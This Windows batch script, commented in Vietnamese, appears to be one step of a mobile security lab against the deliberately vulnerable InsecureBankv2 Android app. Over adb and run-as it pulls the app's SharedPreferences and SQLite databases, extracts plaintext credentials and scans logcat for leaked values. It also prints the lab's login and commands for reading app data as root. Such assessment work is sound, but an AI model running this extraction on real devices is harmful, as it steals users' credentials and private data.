@echo off
setlocal enabledelayedexpansion
REM ============================================================
REM  02_storage_theft.bat — KỊCH BẢN A
REM  Lấy cắp dữ liệu lưu trữ: SharedPreferences + SQLite + logcat
REM
REM  scripts\02_storage_theft.bat              (nhắc đăng nhập thủ công)
REM  scripts\02_storage_theft.bat --no-wait    (đọc luôn)
REM ============================================================

call "%~dp0lib.bat" init

echo.
echo ==================================================
echo  KICH BAN A - Lay cap du lieu luu tru
echo ==================================================
echo.

call "%~dp0lib.bat" require_device
if errorlevel 1 (
    call "%~dp0lib.bat" record "storage" "blocked" "no device" ""
    endlocal & exit /b 1
)

set "APK=%ROOT%\apk\insecurebankv2.apk"
if not exist "%APK%" (
    call "%~dp0lib.bat" err "Chua co apk\insecurebankv2.apk"
    endlocal & exit /b 1
)

set "NOWAIT=0"
if /i "%~1"=="--no-wait" set "NOWAIT=1"

REM ---------- 1. Cài ----------
call "%~dp0lib.bat" log "[1/6] Dam bao app da cai..."
adb shell pm list packages 2>nul | findstr /i /c:"package:%PKG%" >nul
if errorlevel 1 (
    adb install -r "%APK%"
) else (
    call "%~dp0lib.bat" ok "%PKG% da cai"
)

REM ---------- 2. run-as ----------
call "%~dp0lib.bat" log "[2/6] Kiem tra run-as..."
adb shell "run-as %PKG% id" > "%LOGS%\run_as_check.txt" 2>&1
type "%LOGS%\run_as_check.txt"

findstr /i "uid=" "%LOGS%\run_as_check.txt" >nul
if errorlevel 1 (
    call "%~dp0lib.bat" err "run-as bi tu choi - app khong debuggable"
    call "%~dp0lib.bat" record "storage" "blocked" "run-as denied" "logs/run_as_check.txt"
    echo.
    echo   Khac phuc:
    echo     - Build ban debug:  scripts\00_setup.bat --build
    echo     - Hoac dung emulator co root:
    echo         adb root
    echo         adb shell cat /data/data/%PKG%/shared_prefs/*.xml
    endlocal & exit /b 1
)
call "%~dp0lib.bat" ok "run-as OK"

REM ---------- 3. Đăng nhập thủ công ----------
if "%NOWAIT%"=="0" (
    echo.
    echo ================================================
    echo  THAO TAC THU CONG
    echo ================================================
    echo  1. Mo app InsecureBankv2 tren emulator
    echo  2. Dang nhap:  dinesh / Dinesh@123$
    echo  3. Tich "Remember me" neu co
    echo  4. Bam Transfer / View Statement
    echo ================================================
    echo.
    pause
    call "%~dp0lib.bat" log "Doi app ghi shared_prefs (toi da 120s)..."
    call "%~dp0lib.bat" wait_for_prefs 120
    if errorlevel 1 (
        call "%~dp0lib.bat" warn "Khong thay shared_prefs sau 120s - van tiep tuc"
    ) else (
        call "%~dp0lib.bat" ok "Da thay shared_prefs"
    )
)

call "%~dp0lib.bat" screenshot "A1_app_after_login"

REM ---------- 4. Liệt kê data dir ----------
call "%~dp0lib.bat" log "[3/6] Liet ke data dir..."
(
    echo === /data/data/%PKG%
    adb shell "run-as %PKG% ls -la /data/data/%PKG%"
    echo === shared_prefs
    adb shell "run-as %PKG% ls -la /data/data/%PKG%/shared_prefs"
    echo === databases
    adb shell "run-as %PKG% ls -la /data/data/%PKG%/databases"
) > "%LOGS%\data_dir_listing.txt" 2>&1
call "%~dp0lib.bat" ok "data_dir_listing.txt"

REM ---------- 5. SharedPreferences ----------
call "%~dp0lib.bat" log "[4/6] Doc SharedPreferences..."
if not exist "%LOGS%\prefs" mkdir "%LOGS%\prefs"

adb shell "run-as %PKG% ls shared_prefs" 2>nul | findstr /i ".xml" > "%LOGS%\prefs_files.txt"

set "PREFCOUNT=0"
for /f "usebackq delims=" %%F in ("%LOGS%\prefs_files.txt") do (
    set "PNAME=%%F"
    set "PNAME=!PNAME: =!"
    "%PYTHON%" "%ROOT%\scripts\helpers\pull_file.py" %PKG% "shared_prefs/!PNAME!" ^
        "%LOGS%\prefs\!PNAME!" 2>nul
    if exist "%LOGS%\prefs\!PNAME!" (
        call "%~dp0lib.bat" ok "shared_prefs\!PNAME!"
        set /a PREFCOUNT+=1
    )
)

if "%PREFCOUNT%"=="0" (
    call "%~dp0lib.bat" warn "Khong doc duoc file prefs nao"
    call "%~dp0lib.bat" record "storage" "inconclusive" "no prefs files" "logs/data_dir_listing.txt"
) else (
    REM Dung helper Python de tach dung key/value, khong dump ca file XML
    "%PYTHON%" "%ROOT%\scripts\helpers\extract_prefs.py" ^
        "%LOGS%\prefs" ^
        "%LOGS%\prefs_sensitive.txt" ^
        "%LOGS%\prefs_all.txt"
    set "PREFSRC=!errorlevel!"

    if "!PREFSRC!"=="0" (
        call "%~dp0lib.bat" warn "PHAT HIEN: credential dang plaintext trong SharedPreferences"
        call "%~dp0lib.bat" record "storage" "vulnerable" "plaintext credential in SharedPreferences" "logs/prefs_sensitive.txt"
        echo.
        type "%LOGS%\prefs_sensitive.txt"
    ) else if "!PREFSRC!"=="2" (
        call "%~dp0lib.bat" warn "Co file prefs nhung KHONG co credential"
        call "%~dp0lib.bat" warn "Nguyen nhan: chua tich 'Remember me' khi dang nhap"
        call "%~dp0lib.bat" record "storage" "inconclusive" "prefs exist but no credential - enable Remember me" "logs/prefs_all.txt"
        echo.
        echo   -> Dang xuat, dang nhap lai va TICH 'Remember me', roi chay lai:
        echo        scripts\02_storage_theft.bat --no-wait
        type "%LOGS%\prefs_all.txt"
    ) else (
        call "%~dp0lib.bat" err "extract_prefs.py loi (exit=!PREFSRC!)"
        call "%~dp0lib.bat" record "storage" "error" "extract_prefs failed" "logs/prefs_all.txt"
    )
)

REM ---------- 6. SQLite ----------
call "%~dp0lib.bat" log "[5/6] Doc SQLite databases..."
if not exist "%LOGS%\databases" mkdir "%LOGS%\databases"

adb shell "run-as %PKG% ls databases" 2>nul | findstr /v /i /c:"journal" /c:"wal" /c:"shm" > "%LOGS%\db_files.txt"

set "DBCOUNT=0"
for /f "usebackq delims=" %%D in ("%LOGS%\db_files.txt") do (
    set "DNAME=%%D"
    set "DNAME=!DNAME: =!"
    if not "!DNAME!"=="" (
        "%PYTHON%" "%ROOT%\scripts\helpers\pull_file.py" %PKG% "databases/!DNAME!" ^
            "%LOGS%\databases\!DNAME!" 2>nul
        if exist "%LOGS%\databases\!DNAME!" (
            call "%~dp0lib.bat" ok "databases\!DNAME!"
            set /a DBCOUNT+=1
        )
    )
)

if "%DBCOUNT%"=="0" (
    call "%~dp0lib.bat" warn "Khong tim thay database nao"
) else (
    echo === Noi dung database === > "%LOGS%\db_contents.txt"
    "%PYTHON%" "%ROOT%\scripts\helpers\dump_sqlite.py" ^
        "%LOGS%\databases" >> "%LOGS%\db_contents.txt" 2>&1
    call "%~dp0lib.bat" ok "db_contents.txt"
)

REM ---------- 7. Logcat ----------
call "%~dp0lib.bat" log "[6/6] Bat logcat..."
set "APPPID="
for /f "usebackq delims=" %%P in (`adb shell pidof %PKG% 2^>nul`) do set "APPPID=%%P"

if defined APPPID (
    adb logcat -d --pid=%APPPID% > "%LOGS%\logcat_app.txt" 2>&1
) else (
    adb logcat -d > "%LOGS%\logcat_all.txt" 2>&1
    findstr /i /c:"insecurebank" "%LOGS%\logcat_all.txt" > "%LOGS%\logcat_app.txt" 2>nul
)

REM Loc false positive: chi giu dong chua GIA TRI nhay cam, khong phai ten field UI
"%PYTHON%" "%ROOT%\scripts\helpers\filter_logcat.py" ^
    "%LOGS%\logcat_app.txt" ^
    "%LOGS%\logcat_sensitive.txt"
set "LOGRC=!errorlevel!"

for /f %%C in ('find /c /v "" ^< "%LOGS%\logcat_sensitive.txt"') do set "SENSCOUNT=%%C"

if "!LOGRC!"=="0" (
    call "%~dp0lib.bat" warn "logcat co !SENSCOUNT! dong chua GIA TRI nhay cam"
    call "%~dp0lib.bat" record "logcat" "suspicious" "!SENSCOUNT! sensitive lines - review manually" "logs/logcat_sensitive.txt"
) else (
    call "%~dp0lib.bat" ok "logcat khong ro ri gia tri nhay cam (chi la ten field/class)"
    call "%~dp0lib.bat" record "logcat" "clean" "no sensitive values in logcat" "logs/logcat_sensitive.txt"
)

call "%~dp0lib.bat" screenshot "A2_evidence_after_extraction"

echo.
echo ==================================================
echo  KET QUA KICH BAN A
echo ==================================================
echo   evidence\logs\prefs_sensitive.txt
echo   evidence\logs\prefs\*.xml
echo   evidence\logs\db_contents.txt
echo   evidence\logs\logcat_sensitive.txt
echo   evidence\screenshots\A1_*.png, A2_*.png
echo.
call "%~dp0lib.bat" ok "Buoc 2 xong. Tiep: scripts\03_ipc_exploit.bat"
endlocal
